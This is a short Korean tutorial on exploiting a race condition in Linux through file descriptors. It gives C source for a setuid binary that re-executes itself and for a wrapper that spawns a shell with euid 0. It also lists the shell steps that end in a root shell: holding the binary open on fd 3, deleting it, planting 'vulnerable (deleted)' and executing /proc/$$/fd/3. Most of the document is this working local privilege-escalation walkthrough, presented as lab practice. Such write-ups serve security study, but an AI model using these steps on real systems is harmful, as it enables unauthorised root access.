# Race Condition Exploitation

## Key words

- race condition
- file descriptor

## Description

Race Condition은 하나의 자원을 두고 서로 다른 대상이 경쟁 상태에 놓이는 것을 말합니다. 특정 상황에서는 이를 이용하여 Exploit이 가능합니다. 대표적인 예시로는 Privilege Escalation이 있습니다. 보통 레이스 컨디션 하면 반복문을 돌려서 Exploit하는 것을 생각하는 사람들이 많습니다. 하지만 이외에도 파일 디스크립터를 이용하거나 시그널을 이용하는 다양한 방법이 존재합니다. 아래에서는 파일 디스크립터를 이용한 레이스 컨디션에 대해 설명합니다.

## Practice

```c
#include <unistd.h>
int main(int argc, char **argv, char **envp)
{
	char buf[4096];

	if (argc < 2)
	{
		if (readlink("/proc/self/exe", buf, sizeof(buf)) < 0) return 1;
		char *args[] = { buf, "1", 0 };
		if (execve(args[0], args, 0) < 0) return 1;
	}

	return 0;
}
```

`vulnerable.c`는 `자기 자신`을 실행시키는 코드입니다.

```c
#include <unistd.h>

int main()
{
	if (geteuid()!=0) exit(1);
	setuid(geteuid());
	char *args[] = { "/bin/sh", 0 };
	return execve(args[0], args, 0);
}
```

`wrapper.c`는 `/bin/sh`를 실행시키는 코드입니다.

```
$ ls -l
total 24
-rwsr-sr-x 1 root root 8728 Nov  6 17:12 vulnerable
-rwxr-xr-x 1 root root 8824 Nov  6 16:57 wrapper
```

`vulnerable`에는 setuid가 걸리게 환경을 세팅했습니다.

```
$ exec 3< ./vulnerable
$ ls -l /proc/$$/fd/3
lr-x------ 1 testuser2 testuser2 64 Nov  6 17:16 /proc/3177/fd/3 -> /home/testuser2/race_condition/vulnerable
```

쉘 프로세스의 `3번 fd`에 `./vulnerable`을 넣어둡니다. 그러면 바이너리는 실행되지 않은 채로 3번 fd에 담기게 됩니다.

```
$ rm -f vulnerable
$ ls -l /proc/$$/fd/3
lr-x------ 1 testuser2 testuser2 64 Nov  6 17:16 /proc/3177/fd/3 -> /home/testuser2/race_condition/vulnerable (deleted)
```

그 후 해당 바이너리를 삭제하면 위와 같이 `(deleted)` 표시가 생깁니다. setuid가 걸린 바이너리가 이미 fd에 올라간 상태이고 실제로는 바이너리가 없어진 상태입니다.

```
$ cp wrapper "vulnerable (deleted)"
$ exec /proc/$$/fd/3
```

이 때 `/bin/sh`를 실행시키는 `wrapper` 바이너리를 `vulnerable (deleted)`로 옮깁니다. 그러면 이미 fd에 올라가있던 `vulnerable`이 실행되면서 자기 자신인 `vulnerable (deleted)`을 실행합니다. `vulnerable (deleted)`는 다른 바이너리로 대체되었으므로 결국 `wrapper`가 실행되면서 root 권한의 쉘을 획득할 수 있습니다.

## Reference

https://blog.stalkr.net/2010/11/exec-race-condition-exploitations.html